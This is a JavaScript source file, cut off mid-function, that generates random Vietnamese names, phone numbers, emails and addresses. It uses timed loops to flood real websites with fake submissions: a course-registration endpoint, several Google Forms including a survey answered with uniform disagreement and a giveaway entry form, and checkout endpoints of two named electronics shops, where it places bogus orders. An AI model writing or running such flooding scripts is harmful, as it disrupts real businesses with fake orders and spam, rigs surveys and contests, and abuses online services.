// value
var ho = ["Nguyễn ", "Trần ", "Lê ", "Phạm ", "Hoàng ", "Huỳnh ", "Phan ", "Vũ ", "Võ ", "Đặng ", "Bùi ", "Đỗ ", "Hồ ", "Ngô ", "Dương ", "Lý "];
var ten = ["Vân", "Thị Lan", "Thị Anh", "Thị Quỳnh", "Ngọc Vy", "Đức Thành",
    "Văn Thành", "Kiều Trang", "Văn Hoàng", "Như Quỳnh", "Huy Hoàng", "Oanh", "Văn Hoàng", "Duy Kiên", "Nhung", "Xuân Phước",
    "Văn Quyền", "Huấn", "Nga", "Thị Mai", "Loan", "Phương Mai", "Bảo", "Ngọc Bích",
    "Văn Khanh", "Duy Khanh", "Thị Khuyên", "Ngọc Khánh", "Văn Khánh", "Hải Châu", "Huyền", "Châu", "Hải Châu", "Chiến", "Minh Chiến", "Dũng", "Văn Quân", "Văn Phúc", "Ðức", "Văn Hiển", "Xuân Khiển", 'Hào', "Ðăng",
    "Văn Hải", "Thị Ngọc", "Linh Giang", "Hoài", "Thị Hà", "Văn Hà", "Xuân Hương", "Hợp",
    "Thị Hương", "Thị Trang", "Duy Tuyền", "Văn Sơn", "Huy", "Xuân Thủy", "Hùng", "Tùng", "Lộc", "Mạnh", "Huệ", "Phượng", "Thăng", "Thắng", "Minh Đạt", "Văn Tuấn", "Trịnh", "Hồng Thủy", "Thanh Nga", "Thanh Thảo", "Thảo Minh", "Hùng Việt",
    "Cao", "Duyên", "Thu", "Thị Hằng", "Trần Mạnh", "Đạt Danh", "Vinh", "Văn Lợi"
];
var dauso = ["03", "09", "08"];
var quanhanoi = ["Ba Đình",
    "Bắc Từ Liêm",
    "Cầu Giấy",
    "Đống Đa",
    "Hà Đông",
    "Hai Bà Trưng",
    "Hoàn Kiếm",
    "Hoàng Mai",
    "Long Biên",
    "Nam Từ Liêm",
    "Tây Hồ",
    "Thanh Xuân",
    "Thị xã",
    "Sơn Tây",
    "Ba Vì",
    "Chương Mỹ",
    "Đan Phượng",
    "Đông Anh",
    "Gia Lâm",
    "Hoài Đức",
    "Mê Linh",
    "Mỹ Đức",
    "Phú Xuyên",
    "Phúc Thọ",
    "Quốc Oai",
    "Sóc Sơn",
    "Thạch Thất",
    "Thanh Oai",
    "Thanh Trì",
    "Thường Tín",
    "Ứng Hòa"
];
var quanhcm = ["Quận 1",
    "Quận 12",
    "Quận Thủ Đức",
    "Quận 9",
    "Quận Gò Vấp",
    "Quận Bình Thạnh",
    "Quận Tân Bình",
    "Quận Tân Phú",
    "Quận Phú Nhuận",
    "Quận 2",
    "Quận 3",
    "Quận 10",
    "Quận 11",
    "Quận 4",
    "Quận 5",
    "Quận 6",
    "Quận 8",
    "Quận Bình Tân",
    "Quận 7",
    "Huyện Củ Chi",
    "Huyện Hóc Môn",
    "Huyện Bình Chánh",
    "Huyện Nhà Bè",
    "Huyện Cần Giờ"
];
var phuonghanoi = ["Phúc Xá", "Ngọc Hà", "Đội Cấn", "Ngọc Khánh", "Kim Mã", "Giảng Võ", "Thành Công", "Cống Vị", "Liễu Giai", "Vĩnh Phúc", "Điện Biên", "Trúc Bạch", "Quán Thánh", "Nguyễn Trung Trực",
    "Đồng Xuân", "Cửa Nam", "Chương Dương", "Phúc Tân", "Hàng Buồm", "Trần Hưng Đạo", "Tràng Tiền", "Lý Thái Tổ", "Hàng Trống", "Hàng Mã", "Hàng Bông", "Cửa Đông", "Hàng Bài", "Hàng Gai", "Hàng Bồ", "Phan Chu Trinh", "Hàng Bạc", "Hàng Đào",
    "Ngọc Thụy", "Bồ Đề", "Đức Giang", "Thượng Thanh", "Ngọc Lâm", "Sài Đồng", "Thạch Bàn", "Long Biên", "Phúc Lợi", "Phúc Đồng", "Giang Biên", "Cự Khối", "Gia Thụy", "Việt Hưng",
    "Thanh Xuân Bắc", "Thanh Xuân Trung", "Thanh Xuân Nam", "Khương Trung", "Phương Liệt", "Nhân Chính", "Khương Mai", "Thượng Đình", "Khương Đình", "Hạ Đình", "Kim Giang",
    "Nghĩa Đô", "Nghĩa Tân", "Mai Dịch", "Quan Hoa", "Dịch Vọng", "Dịch Vọng Hậu", "Yên Hòa", "Trung Hòa", "Đại Kim", "Định Công", "Hoàng Văn Thụ", "Hoàng Liệt", "Tân Mai", "Tương Mai", "Mai Động", "Lĩnh Nam", "Thịnh Liệt", "Giáp Bát", "Vĩnh Hưng", "Thanh Trì", "Yên Sở", "Trần Phú", "Yên Phụ", "Phú Thượng", "Thụy Khuê", "Xuân La", "Bưởi", "Tứ Liên", "Nhật Tân", "Quảng An",
    "Hàng Bột", "Văn Chương", "Thổ Quan", "Phương Liên", "Kim Liên", "Phương Mai", "Khương Thượng", "Thịnh Quang", "Trung Liệt", "Quang Trung", "Nam Đồng", "Ô Chợ Dừa", "Láng Hạ", "Láng Thượng", "Trung Phụng", "Ngã Tư Sở", "Trung Tự", "Khâm Thiên", "Quốc Tử Giám", "Cát Linh", "Văn Miếu", "Đồng Tâm", "Trương Định", "Minh Khai", "Vĩnh Tuy", "Bạch Đằng", "Thanh Lương", "Thanh Nhàn", "Bạch Mai", "Nguyễn Du", "Bùi Thị Xuân", "Lê Đại Hành", "Ngô Thì Nhậm", "Phố Huế", "Phạm Đình Hổ", "Đồng Nhân", "Đông Mác", "Ô Cầu Dền", "Bách Khoa", "Quỳnh Lôi", "Quỳnh Mai",
    "Mỹ Đình 1", "Mỹ Đình 2", "Mễ Trì", "Phú Đô", "Đại Mỗ", "Tây Mỗ", "Trung Văn", "Phương Canh", "Xuân Phương", "Cầu Diễn", "Thụy Phương", "Liên Mạc", "Tây Tựu", "Minh Khai", "Thượng Cát", "Xuân Tảo", "Xuân Đỉnh", "Đông Ngạc", "Đức Thắng", "Phúc Diễn", "Cổ Nhuế 1", "Cổ Nhuế 2", "Phú Diễn", "Phú Lãm", "Phú Lương", "Quang Trung", "Nguyễn Trãi", "Vạn Phúc", "Phúc La", "Hà Cầu", "Yết Kiêu", "Yên Nghĩa", "Văn Quán", "Mộ Lao", "La Khê", "Đồng Mai", "Dương Nội", "Kiến Hưng", "Phú La", "Biên Giang"
];
var phuonghcm = [
    "Tân Định",
    "Đa Kao",
    "Bến Nghé",
    "Bến Thành",
    "Nguyễn Thái Bình",
    "Phạm Ngũ Lão",
    "Cầu Ông Lãnh",
    "Cô Giang",
    "Nguyễn Cư Trinh",
    "Cầu Kho",
    "Thạnh Xuân",
    "Thạnh Lộc",
    "Hiệp Thành",
    "Thới An",
    "Tân Chánh Hiệp",
    "An Phú Đông",
    "Tân Thới Hiệp",
    "Trung Mỹ Tây",
    "Tân Hưng Thuận",
    "Đông Hưng Thuận",
    "Tân Thới Nhất",
    "Linh Xuân",
    "Bình Chiểu",
    "Linh Trung",
    "Tam Bình",
    "Tam Phú",
    "Hiệp Bình Phước",
    "Hiệp Bình Chánh",
    "Linh Chiểu",
    "Linh Tây",
    "Linh Đông",
    "Bình Thọ",
    "Trường Thọ",
    "Long Bình",
    "Long Thạnh Mỹ",
    "Tân Phú",
    "Hiệp Phú",
    "Tăng Nhơn Phú A",
    "Tăng Nhơn Phú B",
    "Phước Long B",
    "Phước Long A",
    "Trường Thạnh",
    "Long Phước",
    "Long Trường",
    "Phước Bình",
    "Phú Hữu",
    "Phường 15",
    "Phường 13",
    "Phường 17",
    "Phường 06",
    "Phường 16",
    "Phường 12",
    "Phường 14",
    "Phường 10",
    "Phường 05",
    "Phường 07",
    "Phường 04",
    "Phường 01",
    "Phường 09",
    "Phường 08",
    "Phường 11",
    "Phường 03",
    "Phường 13",
    "Phường 11",
    "Phường 27",
    "Phường 26",
    "Phường 12",
    "Phường 25",
    "Phường 05",
    "Phường 07",
    "Phường 24",
    "Phường 06",
    "Phường 14",
    "Phường 15",
    "Phường 02",
    "Phường 01",
    "Phường 03",
    "Phường 17",
    "Phường 21",
    "Phường 22",
    "Phường 19",
    "Phường 28",
    "Phường 02",
    "Phường 04",
    "Phường 12",
    "Phường 13",
    "Phường 01",
    "Phường 03",
    "Phường 11",
    "Phường 07",
    "Phường 05",
    "Phường 10",
    "Phường 06",
    "Phường 08",
    "Phường 09",
    "Phường 14",
    "Phường 15",
    "Phường Tân Sơn Nhì",
    "Phường Tây Thạnh",
    "Phường Sơn Kỳ",
    "Phường Tân Qúy",
    "Phường Tân Thành",
    "Phường Phú Thọ Hoà",
    "Phường Phú Thạnh",
    "Phường Phú Trung",
    "Phường Hoà Thạnh",
    "Phường Hiệp Tân",
    "Phường Tân Thới Hoà",
    "Phường 04",
    "Phường 05",
    "Phường 09",
    "Phường 07",
    "Phường 03",
    "Phường 01",
    "Phường 02",
    "Phường 08",
    "Phường 15",
    "Phường 10",
    "Phường 11",
    "Phường 17",
    "Phường 14",
    "Phường 12",
    "Phường 13",
    "Phường Thảo Điền",
    "Phường An Phú",
    "Phường Bình An",
    "Phường Bình Trưng Đông",
    "Phường Bình Trưng Tây",
    "Phường Bình Khánh",
    "Phường An Khánh",
    "Phường Cát Lái",
    "Phường Thạnh Mỹ Lợi",
    "Phường An Lợi Đông",
    "Phường Thủ Thiêm",
    "Phường 08",
    "Phường 07",
    "Phường 14",
    "Phường 12",
    "Phường 11",
    "Phường 13",
    "Phường 06",
    "Phường 09",
    "Phường 10",
    "Phường 04",
    "Phường 05",
    "Phường 03",
    "Phường 02",
    "Phường 01",
    "Phường Bình Hưng Hòa",
    "Phường Bình Hưng Hoà A",
    "Phường Bình Hưng Hoà B",
    "Phường Bình Trị Đông",
    "Phường Bình Trị Đông A",
    "Phường Bình Trị Đông B",
    "Phường Tân Tạo",
    "Phường Tân Tạo A",
    "Phường An Lạc",
    "Phường An Lạc A",
    "Phường Tân Thuận Đông",
    "Phường Tân Thuận Tây",
    "Phường Tân Kiểng",
    "Phường Tân Hưng",
    "Phường Bình Thuận",
    "Phường Tân Quy",
    "Phường Phú Thuận",
    "Phường Tân Phú",
    "Phường Tân Phong",
    "Phường Phú Mỹ"
];
var xa = ["Xã Phú Mỹ Hưng",
    "Xã An Phú",
    "Xã Trung Lập Thượng",
    "Xã An Nhơn Tây",
    "Xã Nhuận Đức",
    "Xã Phạm Văn Cội",
    "Xã Phú Hòa Đông",
    "Xã Trung Lập Hạ",
    "Xã Trung An",
    "Xã Phước Thạnh",
    "Xã Phước Hiệp",
    "Xã Tân An Hội",
    "Xã Phước Vĩnh An",
    "Xã Thái Mỹ",
    "Xã Tân Thạnh Tây",
    "Xã Hòa Phú",
    "Xã Tân Thạnh Đông",
    "Xã Bình Mỹ",
    "Xã Tân Phú Trung",
    "Xã Tân Thông Hội",
    "Thị trấn Hóc Môn",
    "Xã Tân Hiệp",
    "Xã Nhị Bình",
    "Xã Đông Thạnh",
    "Xã Tân Thới Nhì",
    "Xã Thới Tam Thôn",
    "Xã Xuân Thới Sơn",
    "Xã Tân Xuân",
    "Xã Xuân Thới Đông",
    "Xã Trung Chánh",
    "Xã Xuân Thới Thượng",
    "Xã Bà Điểm",
    "Thị trấn Tân Túc",
    "Xã Phạm Văn Hai",
    "Xã Vĩnh Lộc A",
    "Xã Vĩnh Lộc B",
    "Xã Bình Lợi",
    "Xã Lê Minh Xuân",
    "Xã Tân Nhựt",
    "Xã Tân Kiên",
    "Xã Bình Hưng",
    "Xã Phong Phú",
    "Xã An Phú Tây",
    "Xã Hưng Long",
    "Xã Đa Phước",
    "Xã Tân Quý Tây",
    "Xã Bình Chánh",
    "Xã Quy Đức",
    "Thị trấn Nhà Bè",
    "Xã Phước Kiển",
    "Xã Phước Lộc",
    "Xã Nhơn Đức",
    "Xã Phú Xuân",
    "Xã Long Thới",
    "Xã Hiệp Phước",
    "Thị trấn Cần Thạnh",
    "Xã Bình Khánh",
    "Xã Tam Thôn Hiệp",
    "Xã An Thới Đông",
    "Xã Thạnh An",
    "Xã Long Hòa",
    "Xã Lý Nhơn"
];
var tinh = ["An Giang",
    "Bà Rịa - Vũng Tàu",
    "Bắc Giang",
    "Bắc Kạn",
    "Bạc Liêu",
    "Bắc Ninh",
    "Bến Tre",
    "Bình Định",
    "Bình Dương",
    "Bình Phước",
    "Bình Thuận",
    "Cà Mau",
    "Cao Bằng",
    "Đắk Lắk",
    "Đắk Nông",
    "Điện Biên",
    "Đồng Nai",
    "Đồng Tháp",
    "Gia Lai",
    "Hà Giang",
    "Hà Nam",
    "Hà Tĩnh",
    "Hải Dương",
    "Hậu Giang",
    "Hòa Bình",
    "Hưng Yên",
    "Khánh Hòa",
    "Kiên Giang",
    "Kon Tum",
    "Lai Châu",
    "Lâm Đồng",
    "Lạng Sơn",
    "Lào Cai",
    "Long An",
    "Nam Định",
    "Nghệ An",
    "Ninh Bình",
    "Ninh Thuận",
    "Phú Thọ",
    "Quảng Bình",
    "Quảng Nam",
    "Quảng Ngãi",
    "Quảng Ninh",
    "Quảng Trị",
    "Sóc Trăng",
    "Sơn La",
    "Tây Ninh",
    "Thái Bình",
    "Thái Nguyên",
    "Thanh Hóa",
    "Thừa Thiên Huế",
    "Tiền Giang",
    "Trà Vinh",
    "Tuyên Quang",
    "Vĩnh Long",
    "Vĩnh Phúc",
    "Yên Bái",
    "Phú Yên",
    "Cần Thơ",
    "Đà Nẵng",
    "Hải Phòng",
    "Hà Nội",
    "TP HCM"
];
var ngancach = ["-", ", "];
var s1 = ["Tran ", "Le ", "Pham ", "Hoang ", "Huynh ", "Phan ", "Vu ",
    "Vo ", "Dang ", "Bui ", "Do ", "Ho ", "Ngo ", "Duong ", "Ly ",
    'Vuong ', 'Vu ', 'Vi ', 'Van ', 'Uong ', 'Tu ', 'Truong ', 'Trinh ',
    'Trieu ', 'Tran ', 'Tong ', 'Ton ', 'To ', 'Tieu ', 'Thuy ', 'Than ',
    'Thai ', 'Thach ', 'Tao ', 'Tang ', 'Ta ', 'Quan ', 'Quach ', 'Phung ',
    'Pho ', 'Phan ', 'Pham ', 'ong ', 'Nong ', 'Ning ', 'Nhan ', 'Nguyen ',
    'Ngo ', 'Nghiem ', 'Mong ', 'Mai ', 'Mac ', 'Luu ', 'Luong ', 'Lo ',
    'Linh ', 'Lieu ', 'Li ', 'Le ', 'Lang ', 'Lang ', 'Lam ', 'Kim ',
    'Khuc ', 'Khong ', 'Huynh ', 'Ho ', 'Ham ', 'Ha ', 'Duong ', 'Dong ',
    'Doan ', 'Doan ', 'Do ', 'Dinh ', 'Dao ', 'Dang ', 'Dam ', 'Chung ',
    'Chuc ', 'Chiem ', 'Chau ', 'Cao ', 'Bui ', 'Bang ', 'Dau ', 'Dich ',
    'Diem ', 'Dien ', 'Diep ', 'Dieu ', 'Dinh ', 'Diu ', 'Do ', 'Doai ',
    'Doan ', 'Doanh ', 'Don ', 'Dong ', 'Du ', 'Duc ', 'Dung ', 'Duoc ', 'Duong  ',
    'Duy ', 'Duyen ', 'Duyet ', 'Gam ', 'Gia ', 'Giang ', 'Giao ', 'Giap ',
    'Gioi ', 'Ha ', 'Hai ', 'Han ', 'Hang ', 'Hanh ', 'Hao ', 'Hau ', 'Hien ',
    'Hiep ', 'Hieu ', 'Hinh ', 'Ho ', 'Hoa ', 'Hoach ', 'Hoai ', 'Hoan ', 'Hoang ',
    'Hoanh ', 'Hoat ', 'Hoc ', 'Hoi ', 'Hong ', 'Hop ', 'Hua ', 'Huan ', 'Hue ', 'Hung ',
    'Huong ', 'Huu ', 'Huy ', 'Huyen ', 'Huynh ', 'Ket ', 'Kha ', 'Khai ', 'Kham ',
    'Khang ', 'Khanh ', 'Khau ', 'Khiem ', 'Khiet ', 'Khoa ', 'Khoe ', 'Khoi ',
    'Khuat ', 'Khue ', 'Khuyen ', 'Khuyen ', 'Kien ', 'Kiet ', 'Kieu ', 'Kim ',
    'Kinh ', 'Ky ', 'Ky ', 'La ', 'Lac ', 'Lai ', 'Lam ', 'Lam ', 'Lan ', 'Lang ',
    'Lanh ', 'Le ', 'Len ', 'Li ', 'Lich ', 'Lien ', 'Lieu ', 'Linh ', 'Loan ',
    'Loc ', 'Loi ', 'Long ', 'Lua ', 'Luan ', 'Luc ', 'Luong ', 'Luu ', 'Luyen ',
    'Ly ', 'Ma ', 'Mai ', 'Man ', 'Manh '
];
var s2 = ["Van", "Lan", "Anh", "Quynh", "Ngoc Vy", "Duc Thanh",
    "Thanh", "Kieu Trang", "Hoang", "Nhu Quynh", "Huy Hoang", "Oanh", "Hoang", "Dinh", "Duy Kien", "Nhung", "Xuan Phuoc",
    "Quyen", "Huan", "Nga", "Mai", "Loan", "Phuong Mai", "Bao", "Ngoc Bich",
    "Khanh", "Duy Khanh", "Khuyen", "Ngoc Khanh", "Khanh", "Hai Chau", "Huyen", "Chau", "Hai Chau", "Chien", "Minh Chien", "Dung", "Quan", "Phuc", "Duc", "Hien", "Xuan Khien", 'Hao', "Dang",
    "Hai", "Ngoc", "Linh Giang", "Hoai", "Ha", "Ha", "Xuan Huong", "Hop",
    "Huong", "Trang", "Nhu", "Duy Tuyen", "Son", "Huy", "Xuan Thuy", "Hung", "Tung", "Loc", "Manh", "Hue", "Phuong", "Thang", "Thang", "Minh Đat", "Tuan", "Trinh", "Hong Thuy", "Thanh Nga", "Thanh Thao", "Thao Minh", "Hung Viet",
    "Cao", "Duyen", "Thu", "Hang", "Tran Manh", "Dat Danh", "Vinh", "Loi", "Thi",
    'Ba', 'Bac', 'Bach', 'Ban', 'Bang', 'Bao', 'Bat', 'Bay', 'Be',
    'Bich', 'Bien', 'Binh', 'Boi', 'Bui', 'Buu', 'Ca', 'Cam', 'Can',
    'Canh', 'Cao', 'Cat', 'Cau', 'Chan', 'Chanh', 'Chau', 'Chi',
    'Chien', 'Chieu', 'Chinh', 'Chu', 'Chuan', 'Chuc', 'Chung',
    'Chuong', 'Chuyen', 'Con', 'Cong', 'Cu', 'Cuc', 'Cung', 'Cuong',
    'Cuu', 'Da', 'Dac', 'Dai', 'Dam', 'Dan', 'Dang', 'Danh', 'Dao', 'Dat',
    'Dau', 'Dich', 'Diem', 'Dien', 'Diep', 'Dieu', 'Dinh', 'Diu', 'Do', 'Doai',
    'Doan', 'Doanh', 'Don', 'Dong', 'Du', 'Duc', 'Dung', 'Duoc', 'Duong ',
    'Duy', 'Duyen', 'Duyet', 'Gam', 'Gia', 'Giang', 'Giao', 'Giap',
    'Gioi', 'Ha', 'Hai', 'Han', 'Hang', 'Hanh', 'Hao', 'Hau', 'Hien',
    'Hiep', 'Hieu', 'Hinh', 'Ho', 'Hoa', 'Hoach', 'Hoai', 'Hoan', 'Hoang',
    'Hoanh', 'Hoat', 'Hoc', 'Hoi', 'Hong', 'Hop', 'Hua', 'Huan', 'Hue', 'Hung',
    'Huong', 'Huu', 'Huy', 'Huyen', 'Huynh', 'Ket', 'Kha', 'Khai', 'Kham',
    'Khang', 'Khanh', 'Khau', 'Khiem', 'Khiet', 'Khoa', 'Khoe', 'Khoi',
    'Khuat', 'Khue', 'Khuyen', 'Khuyen', 'Kien', 'Kiet', 'Kieu', 'Kim',
    'Kinh', 'Ky', 'La', 'Lac', 'Lai', 'Lam', 'Lam', 'Lan', 'Lang',
    'Lanh', 'Le', 'Len', 'Li', 'Lich', 'Lien', 'Lieu', 'Linh', 'Loan',
    'Loc', 'Loi', 'Long', 'Lua', 'Luan', 'Luc', 'Luong', 'Luu', 'Luyen',
    'Ly', 'Ma', 'Mai', 'Man', 'Manh', 'Mau', 'May', 'Men', 'Mi',
    'Mich', 'Mien', 'Minh', 'Mo', 'My', 'Nam', 'Ngan', 'Ngat', 'Nghe',
    'Nghi', 'Nghia', 'Ngo', 'Ngoan', 'Ngoc', 'Nguyen', 'Nha', 'Nham',
    'Nhan', 'Nhat', 'Nhi', 'Nhien', 'Nhu', 'Nhung', 'Nhuoc', 'Ninh', 'Nu',
    'Nuong', 'Phac', 'Pham', 'Phan', 'Phap', 'Phi', 'Phong', 'Phu',
    'Phuc', 'Phung', 'Phuong', 'Quach', 'Quan', 'Quang', 'Que', 'Quoc',
    'Quy', 'Quyen', 'Quyet', 'Quynh', 'Sam', 'Sang', 'Sen', 'Son',
    'Song', 'Suong', 'Ta', 'Tai', 'Tan', 'Tang', 'Tao', 'Thach', 'Thai',
    'Tham', 'Than', 'Thanh', 'Thao', 'The', 'Thi', 'Thiem', 'Thien',
    'Thieu', 'Thinh', 'Tho', 'Thoa', 'Thoai', 'Thoan', 'Thom', 'Thong',
    'Thu', 'Thuan', 'Thuc', 'Thuong', 'Thuy', 'Tien', 'Tiep', 'Tin',
    'Tinh', 'To', 'Toan', 'Ton', 'Tra', 'Tram', 'Tran', 'Trang', 'Tri',
    'Trien', 'Triet', 'Trieu', 'Trinh', 'Trong', 'Trung', 'Truong',
    'Tu', 'Tuan', 'Tue', 'Tung', 'Tuong', 'Tuyen', 'Tuyet', 'Ty',
    'Uyen', 'Van', 'Vi', 'Viet', 'Vinh', 'Vo', 'Vu', 'Vuong', 'Vy',
    'Xam', 'Xuan', 'Xuyen', 'Yen'
];
// //////////

function auto() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            $.post("https://hhmacademy.vn/order/advisory", {
                    "dataContact": {
                        "name": "Nguyễn Gia Bình",
                        "content": "(ĐĂNG KÝ HỌC ONLINE khóa ) Thiết Kế & Lập Trình Website PHP Chuyên Nghiệp",
                        "phone": "0869546982",
                        "email": "emyeuthaygiaoverymuch@gmail.com",
                        "courseName": "Thiết Kế & Lập Trình Website PHP Chuyên Nghiệp",
                        "idKhoahoc": 22,
                        "online": 1
                    }
                },
                function(data, status) {
                    console.log("Data: " + data + "\nStatus: " + status);
                });
        }
    }, 3000);
}

function auto2() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var x = Math.floor(Math.random() * 10000000).toString();
            $.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSc6e9lWX_IYTDWrnq8qT8Fr6_lD0W-Lj1j2MxvHU8JsemRoYA/formResponse", {
                    "entry.1280039522": "NGUYEN QUOC KHANH" + x,
                    "entry.1841022131": "NGUYEN QUOC KHANH" + x,
                    "entry.1803097849": "namdtvd" + x,
                    "entry.280118812": "nguyenvanut" + x,
                    "emailAddress": x + "aaaaaaaa@gmail.com",
                    "emailReceipt": "",
                    "g-recaptcha-response": "",
                    "fvv": 1,
                    "draftResponse": [null, null, "3922733030842625842"],
                    "pageHistory": 0,
                    "fbzx": 3922733030842625842
                },
                function(data, status) {
                    console.log("Data: " + data + "\nStatus: " + status);
                });
        }
    }, 4000);
}

function formgg() {
    setInterval(function() {
        for (var i = 0; i < 1; i++) {
            var x = Math.floor(Math.random() * 10000000).toString();
            var nam = Math.floor(Math.random() * 2020).toString();
            var thang = Math.floor(Math.random() * 12).toString();
            var ngay = Math.floor(Math.random() * 28).toString();
            $.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSc75koLww9BwdwThbMvGFkoltFYZOBrzmGAtxXxtC5dcNWEVA/formResponse", {
                    "entry.349522481": x.toString(),
                    "entry.1572996912_year": nam,
                    "entry.1572996912_month": thang,
                    "entry.1572996912_day": ngay,
                    "entry.51073956": "b",
                    "entry.51073956_sentinel": "",
                    "fvv": 1,
                    "draftResponse": [null, null, "3262056714840475501"],
                    "pageHistory": 0,
                    "fbzx": 3262056714840475501
                },
                function(data, status) {
                    console.log("Data: " + data + "\nStatus: " + status);
                });
        }
    }, 1000);
}

function formkhaosat(url) {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var x = Math.floor(Math.random() * 10000000).toString();
            $.post(url, {
                    "entry.1283598965": "08DCNTT1" + x.toString(),
                    "entry.1620054675": "Không đồng ý",
                    "entry.1025863239": "Không đồng ý",
                    "entry.2059117049": "Không đồng ý",
                    "entry.1508537033": "Không đồng ý",
                    "entry.287395829": "Không đồng ý",
                    "entry.530890936": "Không đồng ý",
                    "entry.1554410805": "Không đồng ý",
                    "entry.249561667": "Không đồng ý",
                    "entry.1864458744": "Không đồng ý",
                    "entry.2048941508": "Không đồng ý",
                    "entry.415982467": "Không đồng ý",
                    "entry.438269356": "Không đồng ý",
                    "entry.748292910": "Không đồng ý",
                    "entry.1899093162": "Không đồng ý",
                    "entry.20187723": "Thực hành",
                    "entry.648582627": "Thực hành",
                    "entry.1620054675_sentinel": "",
                    "entry.1025863239_sentinel": "",
                    "entry.2059117049_sentinel": "",
                    "entry.1508537033_sentinel": "",
                    "entry.287395829_sentinel": "",
                    "entry.530890936_sentinel": "",
                    "entry.1554410805_sentinel": "",
                    "entry.249561667_sentinel": "",
                    "entry.1864458744_sentinel": "",
                    "entry.2048941508_sentinel": "",
                    "entry.415982467_sentinel": "",
                    "entry.438269356_sentinel": "",
                    "entry.748292910_sentinel": "",
                    "entry.1899093162_sentinel": "",
                    "entry.20187723_sentinel": "",
                    "entry.648582627_sentinel": "",
                    "fvv": 1,
                    "draftResponse": [null, null, "2315061537240487930"],
                    "pageHistory": 0,
                    "fbzx": 2315061537240487930
                },
                function(data, status) {
                    console.log("Data: " + data + "\nStatus: " + status);
                });
        }
    }, 1000);
}

function hanoicomputer() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var s3 = s1[Math.floor(Math.random() * s1.length)];
            s3 = s3.slice(0, s3.length - 1).toLowerCase();
            var email = s3 + s2[Math.floor(Math.random() * s2.length)].toLowerCase() + "@gmail.com";
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            var sdt = dauso[Math.floor(Math.random() * dauso.length)] + randomso(12345618, 99899978).toString();
            ngancach = ngancach[[Math.floor(Math.random() * ngancach.length)]];
            var quan = [quanhanoi[Math.floor(Math.random() * quanhanoi.length)], quanhcm[Math.floor(Math.random() * quanhcm.length)]];
            var phuong = [phuonghanoi[Math.floor(Math.random() * phuonghanoi.length)], phuonghcm[Math.floor(Math.random() * phuonghcm.length)]];
            var thanhpho = tinh[Math.floor(Math.random() * tinh.length)];
            var diachi = xa[Math.floor(Math.random() * xa.length)] + ngancach + phuong[Math.floor(Math.random() * phuong.length)] + ngancach + quan[Math.floor(Math.random() * quan.length)] + ngancach + thanhpho;
            $.post("https://www.hanoicomputer.vn/send-cart", {
                    "user_info[name]": hoten,
                    "user_info[email]": email,
                    "user_info[tel]": sdt,
                    "user_info[mobile]": "",
                    "user_info[province]": Math.floor(Math.random() * 10), //1,
                    "user_info[district]": Math.floor(Math.random() * 20), //18,
                    "user_info[address]": diachi,
                    "user_info[note]": "",
                    "user_info[tax_company]": "",
                    "user_info[tax_address]": "",
                    "user_info[tax_code]": "",
                    "pay_method": 2,
                    "coupon_code": "",
                    "send_order": "yes",
                    "coupon_code": "",
                    "shipping_fee": 0,
                    "cod_fee": 0,
                    "pay-online-fee": 0
                },
                function(data, status) {
                    // console.log("Data: " + data + "\nStatus: " + status);
                    document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
                    document.writeln();
                });
        }
    }, 1000);
}

function randomso(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}

function giveaway() {



    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            var sdt = dauso[Math.floor(Math.random() * dauso.length)] + randomso(12345618, 99899978).toString();
            // var nam = Math.floor(Math.random() * 2020).toString();
            ngancach = ngancach[[Math.floor(Math.random() * ngancach.length)]];
            var quan = [quanhanoi[Math.floor(Math.random() * quanhanoi.length)], quanhcm[Math.floor(Math.random() * quanhcm.length)]];
            var phuong = [phuonghanoi[Math.floor(Math.random() * phuonghanoi.length)], phuonghcm[Math.floor(Math.random() * phuonghcm.length)]];
            var diachi = xa[Math.floor(Math.random() * xa.length)] + ngancach + phuong[Math.floor(Math.random() * phuong.length)] + ngancach + quan[Math.floor(Math.random() * quan.length)] + ngancach + tinh[Math.floor(Math.random() * tinh.length)];
            var linkfb = "https://www.facebook.com/1000" + randomso(12345671521, 99998789879).toString() + "/posts/" + randomso(123451671521, 999988789879).toString();
            $.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSeL2fmoAwvkK0vW2W2Xj-0H5VimSQFN94bbW1EmRxxhOYWIKg/formResponse", {
                    "entry.1373576849": hoten,
                    "entry.1367665724": sdt,
                    "entry.1807545359": diachi,
                    "entry.358487983": linkfb,
                    "fvv": 1,
                    "draftResponse": [null, null, "7560468672192436606"],
                    "pageHistory": 0,
                    "fbzx": 7560468672192436606
                },
                function(data, status) {
                    // document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
                    document.writeln(".");
                });
        }
    }, 5000);
}
// https://api.vikione.com/api/v1/users/attendance
function tncstore() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var s3 = s1[Math.floor(Math.random() * s1.length)];
            s3 = s3.slice(0, s3.length - 1).toLowerCase();
            var email = s3 + s2[Math.floor(Math.random() * s2.length)].toLowerCase() + "@gmail.com";
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            var sdt = dauso[Math.floor(Math.random() * dauso.length)] + randomso(12345618, 99899978).toString();
            ngancach = ngancach[[Math.floor(Math.random() * ngancach.length)]];
            var quan = [quanhanoi[Math.floor(Math.random() * quanhanoi.length)], quanhcm[Math.floor(Math.random() * quanhcm.length)]];
            var phuong = [phuonghanoi[Math.floor(Math.random() * phuonghanoi.length)], phuonghcm[Math.floor(Math.random() * phuonghcm.length)]];
            var thanhpho = tinh[Math.floor(Math.random() * tinh.length)];
            var diachi = xa[Math.floor(Math.random() * xa.length)] + ngancach + phuong[Math.floor(Math.random() * phuong.length)] + ngancach + quan[Math.floor(Math.random() * quan.length)] + ngancach + thanhpho;
            $.post("https://www.tnc.com.vn/cart/checkout_address.html", {
                    "d_name": hoten,
                    "d_address": diachi,
                    "d_country": "Việt Nam",
                    "d_city": thanhpho,
